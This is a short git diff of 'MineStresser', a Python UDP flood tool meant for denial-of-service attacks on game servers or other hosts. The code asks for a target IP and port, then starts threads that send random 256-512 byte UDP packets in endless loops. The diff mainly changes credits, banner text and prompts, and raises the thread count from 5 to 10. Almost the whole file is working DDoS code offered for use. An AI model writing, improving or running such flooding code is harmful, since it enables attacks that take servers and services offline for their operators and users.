@@ -4,38 +4,38 @@ import os
 import random
 import threading
 
-# Coding by: MineStresser
-# VPS
+# Coding MineStresser
+# Attack
 def attack(ip, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   while True:
     len = random.randint(256, 512)
     payload = os.urandom(len)
     s.sendto(payload, (ip, port))
-# Menu
+# VPS
 
 art = r"""
 
 
-═══ M I N E S T R E S S E R ═══
+MineStresserUDP
 
 """
 os.system("clear")
 print("\033[31m" + art)
-print("Credit: MineStresser")
+print("Credit: @MineGamerST")
 print(" ")
 time.sleep(1)
-ip = input("Enter The Server IP: ")
-port = int(input("Enter The Server Port: "))
+ip = input("IP: ")
+port = int(input("PORT: "))
 time.sleep(1)
 print(" ")
 os.system("clear")
 print(art)
 print(" ")
-print(f"Running DDoS INTO {ip} {port} !")
+print(f"Running {ip} {port}")
 # Start Attack
 
-for i in range(5):
+for i in range(10):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
